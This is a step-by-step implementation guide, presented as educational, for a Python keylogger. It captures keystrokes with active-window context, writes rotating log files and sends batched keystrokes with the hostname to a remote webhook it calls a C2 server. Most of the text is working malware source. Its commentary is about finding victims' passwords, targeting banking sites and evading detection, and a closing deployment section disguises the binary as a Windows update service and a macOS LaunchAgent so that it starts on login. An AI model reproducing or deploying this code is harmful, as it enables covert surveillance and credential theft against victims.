# Implementation Guide

This document walks through the actual code. We'll build key features step by step and explain the decisions along the way.

## File Structure Walkthrough

```
keylogger/
├── keylogger.py          # 550 lines, complete implementation
│   ├── Imports (1-31)    # Dependencies and platform detection
│   ├── Platform constants + conditional imports (32-48)
│   ├── Module-level constants (49-52)
│   ├── SPECIAL_KEYS dict (75-95)
│   ├── KeyType enum (98-104)
│   ├── KeyloggerConfig (107-120)   # Pure data container, no side effects
│   ├── KeyEvent (123-152)        # Keystroke record
│   ├── WindowTracker (155-219)   # Platform window detection
│   ├── LogManager (222-296)      # Direct file I/O with rotation
│   ├── WebhookDelivery (298-371) # Remote exfiltration (buffer swap)
│   └── Keylogger (373-533)       # Main controller
├── test_keylogger.py     # 598 lines, 46 pytest tests
└── pyproject.toml        # Dependencies and tool config
```

## Building the Data Models

### Step 1: Key Classification with Enums

What we're building: Type-safe classification of keyboard events

Create the `KeyType` enum (`keylogger.py:98-104`):

```python
class KeyType(Enum):
    """
    Categorizes keystrokes as character, special, or unknown
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()
```

**Why this code works:**
- `Enum` from Python's standard library provides type safety at runtime
- `auto()` generates unique integer values automatically so we don't hardcode numbers
- CHAR represents printable characters (a-z, 0-9, symbols)
- SPECIAL represents control keys (Enter, Tab, arrows, modifiers)
- UNKNOWN handles edge cases where key classification fails

**Common mistakes here:**
```python
key_type = "char"

key_type = KeyType.CHAR
```

### Step 2: Configuring Behavior with Dataclasses

Now we need centralized configuration that's easy to read and modify.

In `keylogger.py` (lines 107-120):

```python
@dataclass
class KeyloggerConfig:
    """
    Runtime configuration for keylogger behavior
    """
    log_dir: Path = Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True
    window_check_interval: float = WINDOW_CHECK_INTERVAL_SECS
```

**What's happening:**
1. `@dataclass` decorator generates `__init__`, `__repr__`, and equality methods automatically
2. Type hints (`Path`, `str | None`, `float`) document expected types and enable static analysis
3. Default values let you customize only what you need: `KeyloggerConfig(max_log_size_mb=1.0)`
4. `window_check_interval` defaults to the module-level constant `WINDOW_CHECK_INTERVAL_SECS` (0.5 seconds), making the polling rate configurable per instance

**Why we do it this way:**
KeyloggerConfig is a pure data container with no side effects on construction. Directory creation happens later in LogManager, not here. This means you can freely create config objects for testing or comparison without touching the filesystem. Dataclasses reduce boilerplate from ~20 lines of `__init__` code to 2 lines of decorator. Type hints catch bugs during development (mypy will complain if you pass `max_log_size_mb="five"` instead of `5.0`). Default values make the config self-documenting about reasonable settings.

**Alternative approaches:**
- Dictionary: `config = {"log_dir": Path.home() / ".keylogger_logs"}` works but has no type safety and keys can be mistyped
- Regular class: Verbose, requires manual `__init__` and `__repr__` implementations
- ConfigParser/YAML file: Adds external dependency and makes defaults less obvious

### Step 3: Representing Keyboard Events

In `keylogger.py` (lines 123-152):

```python
@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    """
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        """
        Convert event to dictionary for serialization
        """
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower(),
        }

    def to_log_string(self) -> str:
        """
        Format event as human readable log line
        """
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window} {self.key}"
```

**Key parts explained:**

The `to_dict()` method converts the event to JSON-serializable format. We call `timestamp.isoformat()` to convert datetime to string like "2025-01-31T14:30:22". The `key_type.name.lower()` converts the enum to string ("char", "special") for readability in JSON.

The `to_log_string()` method formats for human reading. Example output:
```
[2025-01-31 14:30:22][Chrome - Gmail] p
[2025-01-31 14:30:23][Chrome - Gmail] a
[2025-01-31 14:30:23][Chrome - Gmail] [BACKSPACE]
```

The reason we have both methods is that logs are for human review (you scan them visually to find passwords) while JSON is for webhook delivery (parsed programmatically by C2 server).

## Building Cross-Platform Window Tracking

### The Problem

We need to know which application had focus when a keystroke occurred. Windows uses win32gui API. macOS uses NSWorkspace from AppKit. Linux uses xdotool subprocess. How do we support all three without duplicating logic?

### The Solution

Abstract platform differences behind a unified interface. Detect the OS once, call the appropriate method.

### Implementation

In `keylogger.py` (lines 155-219):

```python
class WindowTracker:
    """
    Active window title lookup across OS platforms
    """
    @staticmethod
    def get_active_window() -> str | None:
        """
        Get the title of the currently active window
        """
        system = platform.system()

        if system == WINDOWS and win32gui:
            return WindowTracker._get_windows_window()
        if system == DARWIN and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == LINUX:
            return WindowTracker._get_linux_window()

        return None
```

This public method hides platform complexity. Callers just invoke `WindowTracker.get_active_window()` and get back a string or None regardless of OS. The comparisons use module-level constants (`WINDOWS`, `DARWIN`, `LINUX`) defined at line 53 instead of raw strings, eliminating magic string repetition.

**Windows implementation** (`keylogger.py:175-186`):
```python
@staticmethod
def _get_windows_window() -> str | None:
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        title = win32gui.GetWindowText(hwnd)
        if title:
            return f"{process.name()} - {title}"
        return process.name()
    except Exception:
        return None
```

**Important details:**
- `GetForegroundWindow()` returns a window handle (integer reference)
- `GetWindowThreadProcessId()` converts handle to process ID
- `psutil.Process(pid)` gives us the process name ("chrome.exe")
- We combine process name and window title: "chrome.exe - Gmail"
- Broad exception catching is intentional because window tracking is optional, failure shouldn't crash the keylogger

**macOS implementation** (`keylogger.py:188-199`):
```python
@staticmethod
def _get_macos_window() -> str | None:
    try:
        active = NSWorkspace.sharedWorkspace().activeApplication()
        return active.get('NSApplicationName', 'Unknown')
    except Exception:
        return None
```

**Linux implementation** (`keylogger.py:201-219`):
```python
@staticmethod
def _get_linux_window() -> str | None:
    try:
        result = subprocess.run(
            ['xdotool', 'getactivewindow', 'getwindowname'],
            capture_output=True,
            text=True,
            timeout=1,
            check=False,
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    except Exception:
        return None
```

This shells out to xdotool command-line utility. The `subprocess` module is imported at the top of the file (line 27), not conditionally inside the Linux branch. We set `timeout=1` to avoid hanging if xdotool is slow. `check=False` means non-zero exit codes don't raise exceptions.

### Testing This Feature

Window tracking works if you get non-None results:

```python
from keylogger import WindowTracker

title = WindowTracker.get_active_window()
print(f"Active window: {title}")
```

If you see None, check that platform-specific dependencies are installed. Windows needs pywin32, macOS needs PyObjC, Linux needs xdotool.

## Building the Log Manager

### Step 1: Direct File I/O with Rotation

What we're building: Persistent logging with automatic file rotation using direct file writes

Create `LogManager` class (`keylogger.py:222-296`):

```python
class LogManager:
    """
    File writer with automatic size-based rotation
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        config.log_dir.mkdir(parents=True, exist_ok=True)
        self.current_log_path = self._get_new_log_path()
        self._lock = Lock()
        self._file = open(self.current_log_path, 'a', encoding='utf-8')
```

The `Lock()` from threading module prevents race conditions. Multiple threads (keyboard listener thread, main thread) might write simultaneously. Without the lock, log files could get corrupted with interleaved writes.

Notice that `LogManager.__init__` creates the log directory (`config.log_dir.mkdir(...)`) rather than KeyloggerConfig doing it. This keeps configuration as a pure data container with no side effects on construction.

**Generating log file paths** (`keylogger.py:240-246`):
```python
def _get_new_log_path(self) -> Path:
    """
    Generate a new log file path with timestamp
    """
    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    name = f"{self.config.log_file_prefix}_{ts}.txt"
    return self.config.log_dir / name
```

The `%f` format code includes microseconds, producing filenames like `keylog_20250131_143500_123456.txt`. This prevents collisions when rotation happens within the same second.

### Step 2: Writing Events Thread-Safely

In `keylogger.py` (lines 248-255):

```python
def write_event(self, event: KeyEvent) -> None:
    """
    Write a keyboard event to the log file
    """
    with self._lock:
        self._file.write(event.to_log_string() + '\n')
        self._file.flush()
        self._check_rotation()
```

The `with self._lock:` acquires the lock, executes the indented code, then releases the lock automatically. This is safer than manual `lock.acquire()` and `lock.release()` because it guarantees the lock gets released even if an exception occurs.

LogManager uses direct file I/O (`self._file.write()` and `self._file.flush()`) rather than Python's `logging` module. This gives full control over flushing and rotation without the overhead of log formatters, handlers, and the logging hierarchy.

**What NOT to do:**
```python
def write_event(self, event):
    self._file.write(event.to_log_string() + '\n')
    self._check_rotation()
```

Two threads writing simultaneously can corrupt the file. Thread 1 writes `"[2025-01-31 14:30:22]"`, Thread 2 writes `"[2025-01-31 14:30:22]"` at same time, and the result is `"[2025-01-[2025-01-31 14:30:22]31 14:30:22]"` (corrupted).

### Step 3: Automatic File Rotation

In `keylogger.py` (lines 257-280):

```python
def _check_rotation(self) -> None:
    """
    Rotate log file when size limit is reached
    """
    try:
        size = self.current_log_path.stat().st_size
    except FileNotFoundError:
        self._rotate()
        return

    if size / BYTES_PER_MB >= self.config.max_log_size_mb:
        self._rotate()

def _rotate(self) -> None:
    """
    Close current log file and open a new one
    """
    self._file.close()
    self.current_log_path = self._get_new_log_path()
    self._file = open(self.current_log_path, 'a', encoding='utf-8')
```

This checks file size after every write. When it exceeds `max_log_size_mb` (default 5.0), we close the current file handle and open a new one. The `BYTES_PER_MB` constant (1024 * 1024) avoids a magic number in the division. If the log file was deleted externally (caught by `FileNotFoundError`), we also rotate to a fresh file.

Why 5MB default? Large enough to capture significant activity (5MB of text is ~5 million characters, weeks or months of typing). Small enough to avoid suspicion (a 500MB keylog file screams malware).

### Step 4: Closing the File Handle

In `keylogger.py` (lines 290-296):

```python
def close(self) -> None:
    """
    Close the underlying file handle
    """
    with self._lock:
        self._file.close()
```

The Keylogger's `stop()` method calls `self.log_manager.close()` during shutdown to release the file handle cleanly. This ensures all buffered data is flushed and the OS file descriptor is freed.

## Building Webhook Delivery

### Batching Events for Stealth

What we're building: Remote exfiltration that minimizes network noise

Create `WebhookDelivery` class (`keylogger.py:298-371`):

```python
class WebhookDelivery:
    """
    Batched HTTP delivery of events to a remote endpoint
    """
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)
```

The `enabled` flag is True only if both `webhook_url` is set AND the requests library imported successfully. This handles cases where requests isn't installed gracefully.

**Adding events to buffer** (`keylogger.py:308-324`):
```python
def add_event(self, event: KeyEvent) -> None:
    """
    Buffer an event and deliver when batch is full
    """
    if not self.enabled:
        return

    batch: list[KeyEvent] | None = None
    with self.buffer_lock:
        self.event_buffer.append(event)
        if len(self.event_buffer) >= self.config.webhook_batch_size:
            batch = self.event_buffer
            self.event_buffer = []

    if batch:
        self._deliver_batch(batch)
```

This uses a **buffer swap pattern**: when the batch is full, we swap `self.event_buffer` with a fresh empty list inside the lock, then deliver the old batch *outside* the lock. This means the HTTP POST (which is slow) never blocks other threads from adding events to the buffer. Events accumulate in the buffer. When we hit the batch size (default 50), we send them all at once. This reduces network calls from potentially thousands per minute (fast typer) to maybe 10-20 per minute.

**Delivering the batch** (`keylogger.py:326-357`):
```python
def _deliver_batch(self, events: list[KeyEvent]) -> None:
    """
    POST buffered events to the webhook endpoint
    """
    if not events or not self.config.webhook_url:
        return

    payload = {
        "timestamp": datetime.now().isoformat(),
        "host": platform.node(),
        "events": [e.to_dict() for e in events],
    }

    try:
        response = requests.post(
            self.config.webhook_url,
            json=payload,
            timeout=WEBHOOK_TIMEOUT_SECS,
        )
        if not response.ok:
            logging.warning("Webhook returned %s", response.status_code)
    except Exception:
        logging.error("Webhook delivery failed", exc_info=True)
```

**Why this specific handling:**
The payload includes `platform.node()` which gives the hostname. This helps attackers track which machine the data came from if they're monitoring multiple victims. The `timestamp` shows when the batch was sent, not when individual keys were pressed (those timestamps are in each event).

The `_deliver_batch` method takes an `events` parameter rather than reading from `self.event_buffer`. Because the buffer was already swapped in `add_event`, the batch is a standalone list that no other thread can modify. The method uses `response.ok` (True for any 2xx status) rather than checking for exactly `status_code == 200`, which correctly handles all success codes. The timeout uses the `WEBHOOK_TIMEOUT_SECS` constant (5 seconds) rather than a magic number.

If delivery fails, we log the error but do not retry. The batch is already detached from the buffer, so those events are lost on failure. This is a deliberate tradeoff: retrying would add complexity and could cause unbounded memory growth if the webhook is permanently down.

**What NOT to do:**
```python
def _deliver_batch(self):
    payload = {...}
    self.event_buffer.clear()

    response = requests.post(webhook_url, json=payload)
```

This loses keystrokes if the network is down. The buffer swap pattern avoids this problem by separating the buffer management (inside the lock) from the network call (outside the lock).

## Building the Main Keylogger

### Processing Keyboard Events

The core of the keylogger is the event handler (`keylogger.py:428-458`):

```python
def _on_press(self, key: Key | KeyCode) -> None:
    """
    Callback for key press events
    """
    if key == self.config.toggle_key:
        self._toggle_logging()
        return

    if not self.is_logging.is_set():
        return

    self._update_active_window()

    key_str, key_type = self._process_key(key)

    if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
        return

    event = KeyEvent(
        timestamp=datetime.now(),
        key=key_str,
        window_title=self._current_window,
        key_type=key_type,
    )

    self.log_manager.write_event(event)
    self.webhook.add_event(event)
```

This callback runs every time a key is pressed. pynput calls it from its own thread, so we need to be careful about thread safety.

**Important details:**
1. Check for toggle key first. If user presses the configured toggle key (default F9), pause/resume logging and early return
2. Check if logging is active. If paused, ignore the keystroke
3. Update active window (only if `window_check_interval` seconds passed since last check)
4. Convert the key to string representation
5. Filter special keys if config says so
6. Create KeyEvent with current timestamp
7. Write to log file (thread-safe via LogManager's lock)
8. Add to webhook buffer (thread-safe via WebhookDelivery's lock)

### Converting Keys to Strings

The `_process_key` method (`keylogger.py:406-426`) handles the messy details of key conversion. It uses the module-level `SPECIAL_KEYS` dictionary (defined at lines 75-95) rather than creating a new dictionary on every call:

```python
def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
    """
    Convert key to string representation and type
    """
    if isinstance(key, Key):
        label = SPECIAL_KEYS.get(key)
        if label:
            return label, KeyType.SPECIAL
        return f"[{key.name.upper()}]", KeyType.SPECIAL

    if hasattr(key, 'char') and key.char:
        return key.char, KeyType.CHAR

    return "[UNKNOWN]", KeyType.UNKNOWN
```

pynput gives us two types: `Key` for special keys (Enter, Shift, arrows) and `KeyCode` for character keys (a, 1, !). We check with `isinstance(key, Key)` to determine which path to take.

For special keys, we look them up in `SPECIAL_KEYS`. Space becomes "[SPACE]", Enter becomes "[ENTER]". Keys not in the dictionary get a generic `[KEY_NAME]` format. This makes logs readable: you can see when someone pressed Enter to submit a form.

For character keys, we extract the `char` attribute. This is just "a" for the A key, "1" for the 1 key, etc.

The `SPECIAL_KEYS` dictionary is defined once at module scope to avoid recreating it on every keystroke:

```python
SPECIAL_KEYS: dict[Key, str] = {
    Key.space: "[SPACE]",
    Key.enter: "[ENTER]",
    Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]",
    Key.delete: "[DELETE]",
    Key.shift: "[SHIFT]",
    Key.shift_r: "[SHIFT]",
    Key.ctrl: "[CTRL]",
    Key.ctrl_r: "[CTRL]",
    Key.alt: "[ALT]",
    Key.alt_r: "[ALT]",
    Key.cmd: "[CMD]",
    Key.cmd_r: "[CMD]",
    Key.esc: "[ESC]",
    Key.up: "[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]",
}
```

### Starting and Stopping

The lifecycle management (`keylogger.py:479-533`):

```python
def start(self) -> None:
    """
    Start the keylogger
    """
    print("Keylogger Started")

    self.is_running.set()
    self.is_logging.set()

    self.listener = keyboard.Listener(on_press=self._on_press)
    self.listener.start()

    try:
        while self.is_running.is_set():
            self.listener.join(timeout=LISTENER_JOIN_TIMEOUT_SECS)
    except KeyboardInterrupt:
        self.stop()

def stop(self) -> None:
    """
    Stop the keylogger gracefully
    """
    print("\n\n[*] Shutting down...")

    self.is_running.clear()
    self.is_logging.clear()

    if self.listener:
        self.listener.stop()

    self.webhook.flush()
    self.log_manager.close()

    print(f"[*] Logs saved to: {self.config.log_dir}")
    print("[*] Keylogger stopped.")
```

We create a `keyboard.Listener` and pass our `_on_press` method as the callback. When we call `listener.start()`, pynput creates a new thread that monitors keyboard events.

The `while self.is_running.is_set():` loop keeps the main thread alive. We join with the `LISTENER_JOIN_TIMEOUT_SECS` constant so we can check for Ctrl+C. Without this loop, the program would exit immediately after starting the listener.

On shutdown, we call `webhook.flush()` to send any remaining buffered events, then `log_manager.close()` to release the file handle. This ensures data isn't lost and OS resources are freed when the program exits.

## Security Implementation

### Toggle Key for Quick Pause

File: `keylogger.py:460-477`

```python
def _toggle_logging(self) -> None:
    """
    Toggle logging on/off with the configured key
    """
    toggle = self.config.toggle_key.name.upper()

    if self.is_logging.is_set():
        self.is_logging.clear()
        print(f"\n[*] Logging paused. Press {toggle} to resume.")
    else:
        self.is_logging.set()
        print(f"\n[*] Logging resumed. Press {toggle} to pause.")
```

**What this prevents:**
If a victim gets suspicious (maybe they see unusual disk activity or network traffic), the attacker can press the toggle key to pause logging. When paused, keystrokes are ignored. This reduces the chance of detection during active investigation.

**How it works:**
1. Every keystroke checks if it equals `config.toggle_key` (default F9)
2. If match, call `_toggle_logging()` and return early
3. The method reads the key name dynamically via `self.config.toggle_key.name.upper()`, so the printed message always matches the configured key (not hardcoded "F9")
4. Toggle switches the `is_logging` Event (thread-safe flag)
5. When logging is off, `_on_press` returns immediately without processing

**What happens if you remove this:**
The keylogger runs continuously. If a victim opens Task Manager and sees high CPU or network usage, they might investigate. Being able to pause reduces this risk.

### Window Context for Targeted Filtering

File: `keylogger.py:390-404`

```python
def _update_active_window(self) -> None:
    """
    Update cached window title periodically
    """
    if not self.config.enable_window_tracking:
        return

    now = datetime.now()
    elapsed = (now - self._last_window_check).total_seconds()

    if elapsed >= self.config.window_check_interval:
        self._current_window = self.window_tracker.get_active_window()
        self._last_window_check = now
```

**What this enables:**
Attackers can filter logs later to find only keystrokes from banking sites, password managers, or corporate VPNs. If every logged keystroke includes `[chrome.exe - Bank of America]`, attackers quickly find credentials.

**Performance optimization:**
We cache the window title for `config.window_check_interval` seconds (default 0.5 via `WINDOW_CHECK_INTERVAL_SECS`). Calling win32gui or NSWorkspace on every keystroke (potentially hundreds per second) would kill performance. With caching, we call it ~2 times per second regardless of typing speed. The interval is configurable per instance, so tests can set it to 0 for immediate updates.

## Data Flow Example

Let's trace a complete request through the system.

**Scenario:** User types "p" while focused on Gmail in Chrome

### Request Comes In

```python
def _on_press(self, key):
```

At this point:
- `key` is `KeyCode(char='p')`
- `self.is_logging` is set (True)
- `self._current_window` is cached from 0.3 seconds ago
- `self.log_manager` has a file open at `/home/user/.keylogger_logs/keylog_20250131_143022_654321.txt`
- `self.webhook.event_buffer` contains 47 events (not yet at batch size 50)

### Processing Layer

```python
key_str, key_type = self._process_key(key)

if hasattr(key, 'char') and key.char:
    return key.char, KeyType.CHAR
```

This code:
- Checks if `key` has a `char` attribute (it does)
- Checks if `key.char` is truthy (it's "p", which is truthy)
- Returns `("p", KeyType.CHAR)`

Why it's structured this way: Some KeyCode objects don't have `char` set (dead keys, compose sequences). We need to check both conditions to avoid AttributeError or empty strings.

### Storage/Output

```python
event = KeyEvent(
    timestamp=datetime.now(),
    key="p",
    window_title="chrome.exe - Gmail",
    key_type=KeyType.CHAR,
)

self.log_manager.write_event(event)

self.webhook.add_event(event)
```

The result is a log file containing the keystroke with full context. We store it in two places: local disk (via LogManager) and in-memory buffer (via WebhookDelivery). The webhook buffer will be sent when it reaches 50 events.

## Error Handling Patterns

### Import Failures for Optional Dependencies

When platform-specific modules aren't available, we handle it gracefully:

```python
if platform.system() == WINDOWS:
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
```

**Why this specific handling:**
If someone runs this on Windows without pywin32 installed, we set `win32gui = None`. Later, WindowTracker checks `if system == WINDOWS and win32gui:` before using it. This prevents crashes and degrades gracefully (no window titles, but keystroke logging still works).

For the core dependency (pynput), failure is not optional. Instead of setting it to None, we re-raise as a clear error:

```python
try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("pynput is required: uv add pynput") from exc
```

This immediately tells the user what to install, using `from exc` to preserve the original traceback for debugging.

**What NOT to do:**
```python
import win32gui

try:
    import win32gui
except:
    pass
```

The first crashes on non-Windows. The second hides actual problems. Always set module to None on import failure so checks later can detect the absence.

### Webhook Delivery Failures

```python
try:
    response = requests.post(
        self.config.webhook_url,
        json=payload,
        timeout=WEBHOOK_TIMEOUT_SECS,
    )
    if not response.ok:
        logging.warning("Webhook returned %s", response.status_code)
except Exception:
    logging.error("Webhook delivery failed", exc_info=True)
```

**Important details:**
- Timeout of `WEBHOOK_TIMEOUT_SECS` (5 seconds) prevents hanging indefinitely if webhook is slow
- `response.ok` checks for any 2xx success status, not just 200
- Broad exception catch handles network errors, DNS failures, SSL cert issues
- `exc_info=True` includes the full traceback in the log for debugging

**Why it matters:**
Production webhooks go down. Networks are unreliable. DNS can fail. Without error handling, a single network hiccup crashes the entire keylogger. With it, we log the error and continue capturing keystrokes.

## Performance Optimizations

### Before: Naive Window Tracking

```python
def _on_press(self, key):
    window_title = WindowTracker.get_active_window()
```

This was slow because on Windows, `win32gui.GetForegroundWindow()` + `win32process.GetWindowThreadProcessId()` + `psutil.Process()` takes ~5ms. At 100 keystrokes per second (fast typer), that's 500ms of CPU time per second, noticeable lag.

### After: Cached Window Tracking

```python
def _update_active_window(self) -> None:
    if not self.config.enable_window_tracking:
        return

    now = datetime.now()
    elapsed = (now - self._last_window_check).total_seconds()

    if elapsed >= self.config.window_check_interval:
        self._current_window = self.window_tracker.get_active_window()
        self._last_window_check = now
```

**What changed:**
- Store `_current_window` as instance variable
- Store `_last_window_check` timestamp
- Only update if `window_check_interval` seconds passed (default 0.5)

**Benchmarks:**
- Before: ~500ms CPU per second at 100 keystrokes/sec
- After: ~10ms CPU per second (50x improvement)
- Tradeoff: Window title might be stale for up to 0.5 seconds

Why 0.5 seconds? People don't switch windows faster than twice per second in normal usage. Even rapid Alt+Tab takes ~1 second. At 0.5 second granularity, we catch 99% of window switches while reducing API calls by 99%.

## Testing Strategy

### Unit Tests

Example test for LogManager:

```python
def test_log_manager():
    with tempfile.TemporaryDirectory() as tmpdir:
        config = KeyloggerConfig(
            log_dir=Path(tmpdir),
            max_log_size_mb=0.001
        )

        manager = LogManager(config)

        for i in range(10):
            event = KeyEvent(
                timestamp=datetime.now(),
                key=f"key_{i}",
                window_title="TestApp",
                key_type=KeyType.CHAR
            )
            manager.write_event(event)

        log_files = list(Path(tmpdir).glob("keylog_*.txt"))
        assert len(log_files) > 0
```

**What this tests:**
- LogManager creates log files in the specified directory
- File rotation works when size limit reached
- Events are written in the correct format

**Why these specific assertions:**
We set `max_log_size_mb=0.001` (1KB) so rotation happens quickly. Writing 10 events with medium-length keys should trigger at least one rotation. We check that files exist (basic functionality) but don't count exact files since timing affects rotation points.

### Running Tests

```bash
just test
```

If tests fail with `ImportError: No module named 'pynput'`, run `just setup` first to install dependencies.

## Common Implementation Pitfalls

### Pitfall 1: Forgetting Thread Safety

**Symptom:**
Random crashes, corrupted log files, garbled text in logs

**Cause:**
```python
class LogManager:
    def write_event(self, event):
        self._file.write(event.to_log_string() + "\n")
```

Two threads write simultaneously:
- Thread 1 writes "[2025-01-31 14:30:22] a"
- Thread 2 writes "[2025-01-31 14:30:22] b" at the same time
- Result in file: "[2025-01-[2025-01-31 14:30:22] b31 14:30:22] a" (corrupted)

**Fix:**
```python
def write_event(self, event: KeyEvent) -> None:
    with self._lock:
        self._file.write(event.to_log_string() + '\n')
        self._file.flush()
        self._check_rotation()
```

**Why this matters:**
Corrupted logs make keystroke analysis impossible. You might capture the password "p@ssw0rd" but the log shows "p@rd0ssw" due to interleaved writes.

### Pitfall 2: Blocking the Event Loop

**Problem:**
Long-running operations in `_on_press` cause dropped keystrokes

**Symptom:**
Fast typing sometimes skips letters

**Cause:**
```python
def _on_press(self, key):
    event = create_event(key)
    requests.post(webhook_url, json=event.to_dict())
```

If the user types "hello" quickly (5 keystrokes in 500ms), the first keystroke blocks for 200ms sending HTTP. The next keystroke comes in 100ms but the callback is still processing. pynput might drop it.

**Fix:**
Buffer events and send asynchronously:
```python
def _on_press(self, key):
    event = create_event(key)
    self.webhook.add_event(event)
```

### Pitfall 3: Not Handling Platform Differences

**Problem:**
Code works on your development machine but crashes on different OS

**Symptom:**
`ImportError` or `AttributeError` on Windows when developed on macOS

**Cause:**
```python
from AppKit import NSWorkspace
active_app = NSWorkspace.sharedWorkspace().activeApplication()
```

This crashes on Windows with `ImportError: No module named 'AppKit'`.

**Fix:**
```python
if platform.system() == DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

if system == DARWIN and NSWorkspace:
    return WindowTracker._get_macos_window()
```

## Code Organization Principles

### Why LogManager is Separate from Keylogger

```python
class Keylogger:
    def write_log(self, event):
        ...
```

We separate LogManager because:
- **Single Responsibility**: Keylogger handles event processing, LogManager handles persistence
- **Testability**: Can test LogManager independently without starting the full keylogger
- **Swappability**: Easy to replace file logging with database logging by swapping LogManager implementation
- **Reusability**: Other projects can use LogManager for any kind of event logging

### Naming Conventions

- `_on_press` = Callback registered with pynput (underscore prefix is pynput convention, not private)
- `_process_key` = Private method (single underscore)
- `get_active_window` = Public API (no underscore)
- `_get_windows_window` = Private platform-specific implementation

Following these patterns makes it easier to distinguish public APIs from internal implementation.

## Dependencies

### Why Each Dependency

- **pynput** (1.8.1): Cross-platform keyboard and mouse control. We use it for keyboard event capture. Alternative (using platform-specific hooks directly) requires maintaining separate codebases for Windows/macOS/Linux.

- **requests** (2.32.5): HTTP library for webhook delivery. Could use urllib from stdlib but requests has cleaner API and better error handling. Timeout support is crucial for preventing hangs.

- **pywin32** (311): Windows-specific APIs for window tracking. Provides win32gui and win32process modules. Only needed on Windows, optional dependency.

- **psutil** (7.2.1): Cross-platform process utilities. On Windows, converts process ID to process name. More reliable than parsing Task Manager output.

- **pyobjc-framework-Cocoa** (12.1): macOS-specific framework for accessing NSWorkspace. Only needed on macOS, optional dependency.

### Dependency Security

Check for vulnerabilities:
```bash
pip install pip-audit
pip-audit
```

If you see CVEs in dependencies, check if they affect our usage. For example, a CSRF vulnerability in requests doesn't matter if we only make POST requests to our own webhook endpoint, not handling user input.

## Build and Deploy

### Building

```bash
just setup    # Create venv, install dependencies
just test     # Run tests
just lint     # Run linting checks
```

This produces no artifacts. The keylogger runs from source as `python keylogger.py`.

To create a standalone executable:
```bash
pyinstaller --onefile --windowed keylogger.py
```

This bundles Python interpreter + dependencies into single .exe (Windows) or binary (Linux/macOS).

### Local Development

```bash
python keylogger.py

# Press the toggle key (default F9) to pause/resume
# Ctrl+C to stop
```

### Production Deployment

For actual malware deployment (educational purposes only):

**Windows:**
```powershell
# Compile to exe
pyinstaller --onefile --noconsole keylogger.py

# Rename to look legitimate
mv dist/keylogger.exe dist/WindowsUpdateService.exe

# Add to startup (requires admin)
copy dist/WindowsUpdateService.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**macOS:**
```bash
# Create LaunchAgent plist
cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/Users/victim/.config/system_update.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.system.update.plist
```

**Key differences from dev:**
- Compiled to native executable (harder to read than Python source)
- Hidden in system directories
- Configured to start automatically
- Renamed to look like legitimate system process

## Next Steps

You've seen how the code works. Now:

1. **Try the challenges** - [04-CHALLENGES.md](./04-CHALLENGES.md) has extension ideas like adding screenshot capture or clipboard monitoring
2. **Modify the code** - Change the toggle key from F9 to F12, observe how it affects behavior
3. **Experiment with batching** - Set `webhook_batch_size` to 5 and watch how often network requests occur (you'll see way more traffic)
